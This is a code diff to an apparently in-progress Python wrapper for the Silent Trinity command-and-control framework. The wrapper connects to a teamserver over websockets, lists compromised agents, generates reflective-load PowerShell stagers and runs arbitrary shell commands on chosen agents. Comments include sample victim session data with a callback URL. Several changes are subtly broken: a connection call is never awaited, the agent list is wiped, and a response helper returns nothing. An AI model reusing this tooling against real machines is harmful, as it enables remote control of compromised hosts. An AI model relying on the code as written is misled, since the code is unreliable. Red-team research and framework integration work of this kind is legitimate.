@@ -29,6 +29,7 @@ from hashlib import sha512
 import ssl
 from urllib.parse import urlparse
 import logging
+import signal 
 
 logger = logging.getLogger(__name__)
 
@@ -39,6 +40,33 @@ def gen_random_string(length: int = 10):
 async def recv_(ws):
     response = await ws.recv()
     logging.info("Response: %r", repr(response))
+
+class ConnectionHandler():
+    async def connect(self, url, head, ssl_context):
+        self.ws = websockets.connect(
+            url, 
+            extra_headers=head, 
+            ssl=ssl_context, 
+            ping_interval=None,
+            ping_timeout=None
+        )
+        # async with websockets.connect(
+        #     url, 
+        #     extra_headers=head, 
+        #     ssl=ssl_context, 
+        #     ping_interval=None, # We disable the built-in ping/heartbeat mechanism and use our own
+        #     ping_timeout=None
+        # ) as ws:
+
+        #     logger.error(f'Connected to {url}')
+        #     self.ws = ws
+        #     self.msg_queue =  asyncio.Queue(maxsize=1)
+        #     asyncio.gather(self.data_handler)
+    async def data_handler(self):
+        pass
+    async def close_connection(self):
+        pass
+
 
 class SilentTriC2(C2):
     name = 'Silent Trinity'
@@ -110,18 +138,24 @@ class SilentTriC2(C2):
 
         URL = urlparse(teamserver_url)
         url = f"{URL.scheme}://{URL.hostname}:{URL.port}"
+        # self.connection = await ConnectionHandler.connect(url,head,ssl_context)
 
-        async with websockets.connect(
+        self.ws = websockets.connect(
             url, 
             extra_headers=head, 
             ssl=ssl_context, 
-            ping_interval=None, # We disable the built-in ping/heartbeat mechanism and use our own
+            ping_interval=None,
             ping_timeout=None
-        ) as ws:
+        )
+        signal.signal(signal.SIGINT, self.exit_gracefully)
+        signal.signal(signal.SIGTERM, self.exit_gracefully)
 
-            logger.error(f'Connected to {url}')
-            self.ws = ws
-            return ResponseDto(successful_transaction=True)
+        return ResponseDto(successful_transaction=True)
+
+
+    def exit_gracefully(self, *args):
+        if hasattr(self, 'ws'):
+            self.ws.close()
 
     async def retrieve_agents(self, dto: RequestDto) -> ResponseDto:
         """
@@ -136,11 +170,11 @@ class SilentTriC2(C2):
         # <--- {"type": "message", "id": "i8Qz3wVLUt", "ctx": "sessions", "name": "list", "status": "success", "result": {"b0c71f5e-660b-4f93-b722-9df523b4b063": {"guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "alias": "b0c71f5e-660b-4f93-b722-9df523b4b063", "address": "192.168.0.117", "info": {"OsReleaseId": "2009", "Jobs": 1, "Sleep": 5000, "Guid": "b0c71f5e-660b-4f93-b722-9df523b4b063", "ProcessId": 7236, "Os": "Microsoft Windows 10 Home 10.0.19043.0", "DotNetVersion": "4.0.30319.42000", "Hostname": "DESKTOP-2LD29PJ", "MinJitter": 0, "HighIntegrity": false, "Debug": true, "MaxJitter": 0, "ProcessName": "powershell", "NetworkAddresses": ["192.168.0.117", "169.254.51.246"], "Domain": "DESKTOP-2LD29PJ", "OsArch": "x64", "Username": "criso", "C2Channels": ["https"], "CallBackUrls": [["https://192.168.0.173:8899"]]}, "lastcheckin": 2.287958860397339}}}
 
         set_ctx = {"id": gen_random_string(), "ctx": "sessions", "cmd": "get_selected", "args": {}, "data": {}}
-        await ws.send(json.dumps(set_ctx))
-        await recv_(ws)
+        await self.ws.send(json.dumps(set_ctx))
+        await recv_(self.ws)
         cmd_list = {"id": gen_random_string(), "ctx": "sessions", "cmd": "list", "args": {}, "data": {}} 
-        await ws.send(json.dumps(cmd_list))
-        response = await recv_(ws)
+        await self.ws.send(json.dumps(cmd_list))
+        response = await recv_(self.ws)
         agents = response['results']
         agents = []
         for agent_id in agents:
@@ -158,8 +192,6 @@ class SilentTriC2(C2):
             agents=agents,
         )
         return dto
-
-
 
 class SilentTriHTTPListenerType(ListenerType):
     name = 'https-profile'
@@ -239,13 +271,13 @@ class SilentTriPowershellLauncherType(LauncherType):
     name = 'Powershell Launcher'
     description = 'Uses powershell.exe to launch Agent using [systemm.reflection.assemly::load()'
     registered_options = [
-        OptionDesc(
-            name='Delay',
-            description='Amount of time that Agent will take the agent to contact the listener in seconds',
-            example='5',
-            field_type='integer',
-            required=True
-        ),
+        # OptionDesc(
+        #     name='Delay',
+        #     description='Amount of time that Agent will take the agent to contact the listener in seconds',
+        #     example='5',
+        #     field_type='integer',
+        #     required=True
+        # ),
     ]
 
     def __init__(self, url: str,  _c2: SilentTriC2) -> None:
@@ -269,6 +301,8 @@ class SilentTriPowershellLauncherType(LauncherType):
         # ---> {"id": "4hM4EksY4b", "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
         # <--- {"type": "message", "id": "4hM4EksY4b", "ctx": "stagers", "name": "generate", "status": "success", "result": {"output": "function Invoke-L..... ", "suggestions": "", "extension": "ps1"}}
 
+        ws = self._c2.ws
+
         set_ctx = {"id": gen_random_string(), "ctx": "stagers", "cmd": "get_selected", "args": {}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         await recv_(ws)
@@ -277,7 +311,8 @@ class SilentTriPowershellLauncherType(LauncherType):
         await ws.send(json.dumps(set_powershell_stagless))
         await recv_(ws)
 
-        set_generate = {"id": gen_random_string(), "ctx": "stagers", "cmd": "generate", "args": {"listener_name": "https"}, "data": {}}                                                                                             
+        listener_name = RequestDto.listener.listener_internal_id
+        set_generate = {"id": gen_random_string(), "ctx": "stagers", "cmd": "generate", "args": {"listener_name": listener_name}, "data": {}}
         await ws.send(json.dumps(set_generate))
         response = await recv_(ws)
         result = response.get('result')
@@ -318,15 +353,18 @@ class PowershellAgentType(AgentType):
         # [*] [TS-UM5UF] b0c71f5e-660b-4f93-b722-9df523b4b063 returned job result (id: Aw8lrj6luD)
         # [*] Path: C:\WINDOWS\System32 Command: whoami Args: 
         # desktop-2ld29pj\criso
+
+        ws = self._c2.ws
+
         set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "use", "args": {"name": "boo/shell"}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         await recv_(ws)
-
-        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": "whoami"}, "data": {}}
+        
+        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "set", "args": {"name": "command", "value": command}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         await recv_(ws)
 
-        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "run", "args": {"guids": ["b0c71f5e-660b-4f93-b722-9df523b4b063"]}, "data": {}}
+        set_ctx = {"id": gen_random_string(), "ctx": "modules", "cmd": "run", "args": {"guids": [shell_dto.agent_internal_id]}, "data": {}}
         await ws.send(json.dumps(set_ctx))
         response = await recv_(ws)
         result = response['result']
